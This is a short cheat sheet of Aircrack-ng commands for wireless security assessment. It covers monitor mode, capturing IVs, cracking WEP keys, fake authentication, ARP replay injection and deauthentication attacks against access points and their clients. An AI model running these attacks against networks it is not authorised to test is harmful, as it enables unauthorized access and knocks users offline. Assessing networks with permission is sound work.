---
title: Aircrack-ng
description: Aircrack-ng - WiFi network security assessment suite
logo: aircrack-ng.png
draft: false
---
### ARP Check
{{< table >}}
Command | Description
--- | ---
`arp -a` | Check for existing clients on the network
{{< /table >}}

### Monitor Mode
{{< table >}}
Command | Description
--- | ---
`airmon-ng start wlp3s0` | Put device in monitor mode (sometimes fails)
`ifconfig wlp3s0 down` | Alternative: bring interface down first
`iwconfig wlp3s0 mode monitor` | Set monitor mode manually
`airodump-ng -c <ch>,<ch> wlp3s0` | Set channel
`ifconfig wlp3s0 up` | Bring interface back up
`iwconfig wlp3s0` | Check if device is in monitor mode
`airodump-ng wlp3s0` | Monitor for Access Points and Clients
{{< /table >}}

### Sniffing
{{< table >}}
Command | Description
--- | ---
`airodump-ng -c <ch> --bssid <MAC> -w dump wlp3s0` | Sniff IVs (40K-85K packets to crack WEP)
{{< /table >}}

### Cracking
{{< table >}}
Command | Description
--- | ---
`aircrack-ng -b <MAC> dump*.cap` | Crack WEP key from packet dump
`aircrack-ng -z <dump>` | Crack WEP key from Packet Injection
{{< /table >}}

### Packet Injection
{{< table >}}
Command | Description
--- | ---
`aireplay-ng --fakeauth 0 -e "<SSID>" -a <MAC> wlp3s0` | Fake authentication with AP
`airodump-ng wlp3s0` | Find a connected client (once)
`airodump-ng -c <ch> --bssid <MAC> -w dump wlp3s0` | Sniff for packets (continuous)
`aireplay-ng --arpreplay -b <MAC> -h <client-MAC> wlp3s0` | Inject ARP packets to generate load
`aireplay-ng --deauth 5 -a <MAC> -c <client-MAC> wlp3s0` | Deauth attack to force ARP packets
{{< /table >}}

### Reset
{{< table >}}
Command | Description
--- | ---
`ifconfig wlp3s0 down` | Bring interface down
`iwconfig wlp3s0 mode managed` | Set managed mode
`ifconfig wlp3s0 up` | Bring interface up
`systemctl restart NetworkManager` | Restart NetworkManager
{{< /table >}}
